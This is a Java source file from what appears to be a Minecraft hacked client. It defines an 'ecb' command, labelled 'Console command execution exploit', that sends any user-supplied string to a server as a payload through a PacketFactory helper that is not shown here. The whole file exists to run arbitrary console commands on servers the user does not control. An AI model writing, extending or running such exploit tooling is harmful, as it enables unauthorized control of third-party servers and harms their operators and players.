package net.paradise_client.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import net.minecraft.command.CommandSource;
import net.paradise_client.*;
import net.paradise_client.command.Command;

public class ECBCommand extends Command {
  public ECBCommand() {
    super("ecb", "Console command execution exploit");
  }

  @Override public void build(LiteralArgumentBuilder<CommandSource> root) {
    root.executes(context -> {
      Helper.printChatMessage("Incomplete command!");
      return SINGLE_SUCCESS;
    }).then(argument("command", StringArgumentType.greedyString()).executes(context -> {
      PacketFactory.sendECB(context.getArgument("command", String.class));
      Helper.printChatMessage("Payload sent!");
      return SINGLE_SUCCESS;
    }));
  }
}
